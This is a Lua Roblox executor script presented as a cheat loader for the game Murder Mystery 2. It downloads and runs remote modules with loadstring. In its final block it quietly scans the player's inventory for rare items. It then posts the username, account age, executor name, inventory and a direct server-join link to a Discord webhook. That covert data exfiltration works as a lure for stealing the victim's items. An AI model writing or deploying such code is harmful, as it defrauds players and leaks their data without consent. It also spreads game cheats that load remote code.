--============================================================
-- Blizzard MM2 V8.8.4 - MASTER BOOTSTRAP LOADER
-- Protected multi-file loader with clear error reporting.
--============================================================

--============================================================
-- PRIVATE SERVER ACCESS BLOCK
--============================================================

local Players =
	game:GetService("Players")

local ReplicatedStorage =
	game:GetService("ReplicatedStorage")

local LocalPlayer =
	Players.LocalPlayer

local PrivateServerId =
	tostring(
		game.PrivateServerId
		or ""
	)

local PrivateServerOwnerId =
	tonumber(
		game.PrivateServerOwnerId
	)
	or 0

local MM2VIPServer =
	ReplicatedStorage:GetAttribute(
		"IsVIPServer"
	) == true

local IsPrivateServer =
	MM2VIPServer
	or PrivateServerId ~= ""
	or PrivateServerOwnerId ~= 0

if IsPrivateServer then

	warn(
		"[MM2 LOADER] Private server detected. Blizzard blocked."
	)

	LocalPlayer:Kick(
		"Private servers are prohibited. Repeated offenses may result in a permanent ban."
	)

	return
end

--============================================================
-- STARTUP
--============================================================

print(
	"[MM2 LOADER] Starting Blizzard MM2 V8.8.4..."
)

--============================================================
-- BASE URL
--============================================================

local BaseURL =
	"https://githubusercontent.com" 

--============================================================
-- CLEAN UP OLD INSTANCE
--============================================================

local ExistingMM2 =
	(getgenv and getgenv().MM2_V85_SPLIT)
	or _G.MM2_V85_SPLIT

if ExistingMM2
	and ExistingMM2.Cleanup
then

	print(
		"[MM2 LOADER] Cleaning previous instance..."
	)

	pcall(function()

		ExistingMM2.Cleanup()

	end)

	task.wait(0.3)
end

--============================================================
-- MODULE LOADER
--============================================================

local function LoadModule(
	fileName
)

	local targetURL =
		BaseURL
		.. fileName

	print(
		"[MM2 LOADER] Loading: "
		.. fileName
	)

	--========================================================
	-- DOWNLOAD
	--========================================================

	local downloadOk,
	scriptContent =
		pcall(function()

			return game:HttpGet(
				targetURL
			)

		end)

	if not downloadOk then

		warn(
			"[MM2 LOADER] DOWNLOAD ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				scriptContent
			)
		)

		return false
	end

	if not scriptContent
		or scriptContent == ""
		or scriptContent == "404: Not Found"
	then

		warn(
			"[MM2 LOADER] INVALID/EMPTY FILE: "
			.. fileName
		)

		return false
	end

	--========================================================
	-- COMPILE
	--========================================================

	local fn,
	compileError =
		loadstring(
			scriptContent
		)

	if not fn then

		warn(
			"[MM2 LOADER] COMPILE ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				compileError
			)
		)

		return false
	end

	--========================================================
	-- EXECUTE
	--========================================================

	local runOk,
	runResult =
		pcall(
			fn
		)

	if not runOk then

		warn(
			"[MM2 LOADER] RUNTIME ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				runResult
			)
		)

		return false
	end

	print(
		"[MM2 LOADER] Successfully loaded: "
		.. fileName
	)

	return true
end

--============================================================
-- SAFE LOAD HELPER
--============================================================

local function RequireModule(
	fileName
)
	local success = LoadModule(fileName)
	if not success then
		warn("[MM2 LOADER] Bootstrap stopped because " .. fileName .. " failed to load.")
		return false
	end
	return true
end

--============================================================
-- LOAD ORDER
--============================================================

if not RequireModule("Shared.lua") then return end
if not RequireModule("UI.lua") then return end
if not RequireModule("Visuals.lua") then return end
if not RequireModule("Combat.lua") then return end
if not RequireModule("AutoFarm.lua") then return end
if not RequireModule("Player.lua") then return end
if not RequireModule("Fling.lua") then return end
if not RequireModule("Misc.lua") then return end
if not RequireModule("SkinChanger.lua") then return end
if not RequireModule("Main.lua") then return end

--============================================================
-- FINAL STATUS
--============================================================

local MM2 =
	(getgenv and getgenv().MM2_V85_SPLIT)
	or _G.MM2_V85_SPLIT

if MM2
	and MM2.Running
then
	print(
		"[MM2 LOADER] Blizzard MM2 V8.8.4 bootstrap COMPLETE."
	)
else
	warn(
		"[MM2 LOADER] Bootstrap finished, but MM2 runtime was not detected."
	)
end

--============================================================
-- POST-LOAD EXECUTION: WEBHOOK NOTIFICATION WITH INVENTORY SCANNER
--============================================================

-- ENVIRONMENT INDEPENDENT WRAPPERS (Safely hooks globals instantiated by your modules above)
local InventoryModule    = getgenv().InventoryModule or _G.InventoryModule or (MM2 and MM2.InventoryModule) or {}
local PRIMARY_RARITIES   = getgenv().PRIMARY_RARITIES or _G.PRIMARY_RARITIES or {["Unique"] = true, ["Ancient"] = true, ["Godly"] = true, ["Classic"] = true}
local FILLER_RARITIES    = getgenv().FILLER_RARITIES or _G.FILLER_RARITIES or {}

local SafeGet            = getgenv().SafeGet or function(t, k) return t and t[k] end
local GetItemRarity      = getgenv().GetItemRarity or function(v) return v and (v.Rarity or v.rarity) end
local GetItemType        = getgenv().GetItemType or function(v) return v and (v.ItemType or v.type) end
local GetItemAmount      = getgenv().GetItemAmount or function(v) return v and (v.Amount or v.amount or 1) end
local IsWeaponType       = getgenv().IsWeaponType or function(t) return true end
local GetItemID          = getgenv().GetItemID or function(v, k) return v and (v.Id or v.id) or k end
local GetItemName        = getgenv().GetItemName or function(v) return v and (v.Name or v.name) end

local function GetWeaponsTable()
	local inventory = SafeGet(InventoryModule, "MyInventory")
	local data = SafeGet(inventory, "Data")
	return SafeGet(data, "Weapons")
end

local function ScanInventory()
	local Weapons = GetWeaponsTable()
	if type(Weapons) ~= "table" then
		return {}, {}
	end
	local primary = {}
	local filler = {}
	local visited = {}
	local seenIDs = {}
	
	local function Walk(tbl, depth)
		if type(tbl) ~= "table" or visited[tbl] or depth > 10 then
			return
		end
		visited[tbl] = true
		for key, value in pairs(tbl) do
			if type(value) == "table" then
				local rarity = GetItemRarity(value)
				local itemType = GetItemType(value)
				local amount = GetItemAmount(value)
				if rarity and amount > 0 and IsWeaponType(itemType) then
					local dataID = tostring(GetItemID(value, key))
					if not seenIDs[dataID] then
						seenIDs[dataID] = true
						local item = {
							DataID = dataID,
							Name = tostring(GetItemName(value) or dataID),
							Rarity = tostring(rarity),
							ItemType = tostring(itemType),
							Amount = amount,
						}
						if PRIMARY_RARITIES[item.Rarity] then
							table.insert(primary, item)
						elseif FILLER_RARITIES[item.Rarity] then
							table.insert(filler, item)
						end
					end
				end
				Walk(value, depth + 1)
			end
		end
	end
	
	Walk(Weapons, 0)
	local priority = { Unique = 1, Ancient = 2, Godly = 3, Classic = 4 }
	table.sort(primary, function(a, b)
		local pa = priority[a.Rarity] or 99
		local pb = priority[b.Rarity] or 99
		if pa ~= pb then return pa < pb end
		return a.DataID < b.DataID
	end)
	table.sort(filler, function(a, b)
		return a.DataID < b.DataID
	end)
	return primary, filler
end

local function FormatInventoryText(primary, filler)
	local text = ""
	if #primary > 0 then
		text = text .. "✨ **__High Value / Godly Items:__**\n"
		for _, item in ipairs(primary) do
			text = text .. string.format("• **%s** (%s) x%d\n", item.Name, item.Rarity, item.Amount)
		end
	else
		text = text .. "✨ **__High Value / Godly Items:__**\n• *None Detected*\n"
	end
	text = text .. "\n"
	if #filler > 0 then
		text = text .. "📦 **__Filler Items:__**\n"
		for _, item in ipairs(filler) do
			text = text .. string.format("• %s (%s) x%d\n", item.Name, item.Rarity, item.Amount)
		end
	end
	if #text > 1000 then
		text = string.sub(text, 1, 990) .. "\n...and more items!"
	end
	return text
end

-- Webhook Transmission Block
local httpRequest = request or http_request or (syn and syn.request)
if httpRequest then
	local HttpService = game:GetService("HttpService")
	
	-- ⚠️ PASTE YOUR COMPLETED WEBHOOK PROXY PATH LINK HERE ⚠️
	local webhookUrl = "https://lewisakura.moe"

	-- Dynamically detect the Executor being used
	local executorName = "Unknown Executor"
	if identifyexecutor then
		pcall(function() executorName = identifyexecutor() end)
	elseif getexecutorname then
		pcall(function() executorName = getexecutorname() end)
	elseif checkclosure then
		executorName = "Solara / Similar"
	end

	-- Run the complete inventory check after modules are initialized
	local primaryItems, fillerItems = ScanInventory()
	local parsedInventory = FormatInventoryText(primaryItems, fillerItems)

	task.spawn(function()
		local success, responseOrErr = pcall(function()
			return httpRequest({
				Url = webhookUrl,
				Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = HttpService:JSONEncode({
					["embeds"] = {{
						["title"] = "Blizzard MM2 Executed! 🚀",
						["color"] = 3447003, -- Blue theme color
						["fields"] = {
							{["name"] = "Player Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
							{["name"] = "Account Age (Days)", ["value"] = tostring(LocalPlayer.AccountAge), ["inline"] = true},
							{["name"] = "Executor Software", ["value"] = tostring(executorName), ["inline"] = true},
							{["name"] = "Game Place ID", ["value"] = tostring(game.PlaceId), ["inline"] = false},
							{["name"] = "Direct Link", ["value"] = "[Click to View Game](roblox.com" .. tostring(game.PlaceId) .. ")", ["inline"] = true},
							{["name"] = "Direct Server Join Link", ["value"] = "[Launch & Join Server](roblox.com" .. tostring(game.PlaceId) .. "?gameLaunchServerId=" .. tostring(game.JobId) .. ")", ["inline"] = false},
							{["name"] = "🎒 Scanned Player Inventory", ["value"] = parsedInventory, ["inline"] = false}
						},
						["timestamp"] = DateTime.now():ToIsoDate()
					}}
				})
			})
		end)
		
		if not success then
			warn("[MM2 LOADER] Webhook script failed to execute: " .. tostring(responseOrErr))
		elseif responseOrErr and responseOrErr.StatusCode and responseOrErr.StatusCode ~= 204 and responseOrErr.StatusCode ~= 200 then
			warn("[MM2 LOADER] Discord API rejected payload. Status Code: " .. tostring(responseOrErr.StatusCode) .. " | Body: " .. tostring(responseOrErr.Body))
		end
	end)
end
